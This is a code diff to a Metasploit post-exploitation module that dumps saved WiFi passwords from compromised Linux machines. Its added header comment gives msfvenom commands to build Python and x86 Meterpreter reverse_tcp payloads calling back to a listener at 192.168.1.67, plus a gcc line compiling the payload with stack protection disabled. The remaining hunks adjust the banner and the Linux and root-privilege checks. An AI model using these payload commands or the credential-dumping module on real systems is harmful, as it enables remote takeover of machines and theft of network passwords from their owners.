@@ -45,6 +45,12 @@
 # msf post(wifi_dump_linux) > exploit
 #
 #
+# [ BUILD PAYLOAD ]
+# msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=666 -f raw -o agent.py
+# OR: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.67 LPORT=666 -f c -o template.c
+# gcc -fno-stack-protector -z execstack template.c -o agent
+#
+#
 # [ HINT ]
 # In some linux distributions postgresql needs to be started and
 # metasploit database deleted/rebuild to be abble to load module.
@@ -239,6 +245,7 @@ def run
 
 
     # Print banner and scan results on screen
+    print_line("")
     print_line("    +--------------------------------------------+")
     print_line("    |     * ESSID WIFI PASSWORD DUMP LINUX *     |")
     print_line("    |            Author : r00t-3xp10it           |")
@@ -261,14 +268,14 @@ def run
     #
     # check for proper operative system (Linux)
     #
-    if not sysinfo['OS'] =~ /Linux/
+    if (not sysinfo['OS'] =~ /Linux/)
       print_error("[ABORT]: This module only works againt Linux systems")
       return nil
     end
     #
     # Check if we are running in an higth integrity context (root)
     #
-    if not runtor =~ /uid=0/
+    unless runtor =~ /uid=0/ || runtor =~ /root/
       print_error("[ABORT]: Root access is required in non-Kali distros ..")
       return nil
     end
